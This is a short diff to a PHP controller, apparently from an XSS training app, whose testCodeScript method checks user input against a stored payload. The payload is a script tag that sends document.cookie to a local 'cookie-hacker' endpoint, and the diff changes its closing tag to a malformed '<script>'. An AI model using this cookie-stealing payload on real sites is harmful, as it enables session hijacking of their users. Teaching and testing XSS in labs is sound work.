@@ -140,7 +140,7 @@ class XssController extends Controller
     }
     public function testCodeScript(Request $request)
     {
-        $codeTest = "<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+document.cookie);</script>";
+        $codeTest = "<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+document.cookie);<script>";
         $stringCode = preg_replace("/\s+/", '', $codeTest);
         $code = $request->code;
         $stringInput = preg_replace("/\s+/", '', $code);
